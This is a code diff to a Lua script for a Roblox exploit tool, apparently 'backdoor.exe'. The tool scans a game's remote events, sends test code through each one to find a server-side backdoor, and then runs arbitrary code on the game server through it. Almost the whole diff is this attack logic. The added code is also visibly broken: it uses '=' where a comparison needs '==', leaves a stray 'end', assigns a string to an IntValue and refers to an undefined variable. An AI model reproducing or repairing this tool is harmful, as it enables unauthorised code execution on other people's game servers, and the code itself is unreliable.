@@ -52,6 +52,7 @@ local config = ui.config;
 local games = ui.games;
 local btns = ui.btns;
 local editor = ui.editor;
+local CurrentBackdoor = nil;
 
 -- // START SESSION \\ --
 genv.backdoorexe = {
@@ -161,9 +162,21 @@ end;
 -- fire RemoteEvent/RemoteFunction with the given arguments in a new thread
 local function runRemote(r, ...)
     if r:IsA("RemoteEvent") then
-        r:FireServer(...);
+        pcall(function()
+            task.spawn(function()
+                spawn(function()
+                    r:FireServer(...);
+                end)
+            end)
+        end)
     elseif r:IsA("RemoteFunction") then
-        r:InvokeServer(...);
+        pcall(function()
+            task.spawn(function()
+                spawn(function()
+                    r:InvokeServer(...);
+                end)
+            end)
+        end)
     end
 end;
 
@@ -184,6 +197,18 @@ local function urString(len, parent)
         name = "";
     end
     return name;
+end;
+
+local function GenerateRandomString(Length)
+    local Alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};
+
+	local String = "";
+	
+	for i = 1, Length do
+		String = String .. Alphabet[math.random(1,#Alphabet)];
+	end
+	
+	return String;
 end;
 
 -- wrap to make a BackdoorGateway
@@ -262,6 +287,21 @@ local function getRemotes()
     return remotes;
 end;
 
+local function CheckBackdoor(Remote, BackdoorCode)
+        if game:GetService("ReplicatedStorage"):FindFirstChild(BackdoorCode) then
+            if game:GetService("ReplicatedStorage"):FindFirstChild(BackdoorCode):IsA("IntValue") then
+                if game:GetService("ReplicatedStorage"):FindFirstChild(BackdoorCode).Value = BackdoorCode then
+                    return Remote;
+                end;
+            end;
+        end;
+        
+        task.wait();
+
+        return false
+    end;
+end;
+
 -- scan all game remotes and return all backdoors found
 local function scan(remotes, delayFactor)
     delayFactor = delayFactor or 1;
@@ -281,19 +321,31 @@ local function scan(remotes, delayFactor)
         end;
     end);
     ui.title.Text = TITLE .. " [Testing]";
-    -- loop all remotes
+    --loop all remotes
     for i, r in ipairs(remotes) do
-        -- loop solvers
-        for j, s in ipairs(BACKDOOR_SOLVER) do
-            -- create a new backdoor gateway
-            local g = makeGateway(r, s);
-            -- this will ensure we generate an unique string inside URSTRING_TO_BACKDOOR and workspace
-            local dummyName = urString(5, workspace) .. i .. j;
-            -- register gateway
-            URSTRING_TO_BACKDOOR[dummyName] = g;
-            -- make dummy test
-            s.makeDummy(r, dummyName);
-        end;
+        local Code = GenerateRandomString(math.random(15, 29));
+			
+        runRemote(r, [[
+            local IntValue = Instance.new("IntValue");
+
+            IntValue.Value = "]] .. Code .. [[";
+
+            IntValue.Name = "]] .. Code .. [[";
+
+            game:GetService("Debris"):AddItem(IntValue, 2 + 1);
+
+            IntValue.Parent = game:GetService("ReplicatedStorage");
+        ]]);
+        
+        repeat CheckBackdoor(r, Code) until not CheckBackdoor(r, Code) == false;
+
+        CurrentBackdoor = r;
+
+        ui.title.Text = TITLE .. " [Attached Backdoor]";
+
+        task.wait();
+        
+        alertLib.Info(screenGui, TITLE, "Attached Backdoor:", r:GetFullName(), 4);
     end;
     -- force disconnect after localPlayer:GetNetworkPing() * delayFactor * #remotes
     local timeOut = math.max((localPlayer:GetNetworkPing() * delayFactor) * #remotes, MAXTIMEOUT);
@@ -313,68 +365,25 @@ local function scan(remotes, delayFactor)
 end;
 
 local executing = false;
+
 local function execute(code, gateway, canDebug, disableAlerts)
-    assert(code and gateway, "missing code or gateway");
+    executing = true;
+    
     ui.title.Text = TITLE .. " [Executing]";
-    local completed = Instance.new("BindableEvent");
-    -- completed destroy
-    completed.Event:Connect(function()
-        completed:Destroy();
-    end);
-    -- debug script case
-    if canDebug then
-        local token = urString(5, workspace);
-        -- pcall wrapper
-        code = EXEC_DEBUG:format(code, token);
-        -- listen for error instance
-        local connection;
-        connection = workspace.ChildAdded:Connect(function(child)
-            if child.Name == token then
-                -- stdout print, warn
-                local stdout = child:GetAttribute("stdout");
-                if typeof(stdout) == "string" then
-                    local integrity, parsed = pcall(httpService.JSONDecode, httpService, stdout);
-                    if integrity then
-                        for i, out in next, parsed do
-                            if out.warn then
-                                warn(table.unpack(out.value));
-                            else
-                                print(table.unpack(out.value));
-                            end
-                        end
-                    end
-                end
-                -- stdout err in the console
-                if not child.Value then
-                        -- alert to user
-                        if not disableAlerts then
-                        alertLib.Error(screenGui, TITLE, 'Execution error in console.');
-                        end;
-                    task.spawn(error, child:GetAttribute("err"));
-                elseif not disableAlerts then
-                    alertLib.Success(screenGui, TITLE, 'Script successfully executed.');
-                end;
-                completed:Fire(child.Value);
-                -- disconnect
-                connection:Disconnect();
-                connection = nil; -- force gc
-            end
-        end);
-        -- force disconnect after 60 seconds (aka max execution time)
-        task.delay(60 , function()
-            if connection then
-                connection:Disconnect();
-            end;
-        end);
-    else
-        -- this will fire completed event just in case is needed with non-debug mode
-        task.delay(0.1, function()
-            completed:Fire(true);
-        end);
-    end;
-    -- execute code
-    gateway:Execute(code);
-    return completed.Event;
+    
+    runRemote(CurrentBackdoor, Code);
+
+    task.wait();
+
+    ui.title.Text = TITLE .. " [Executed]";
+
+    task.wait(2);
+
+    ui.title.Text = TITLE .. " ";
+
+    executing = false;
+    
+    return
 end;
 
 
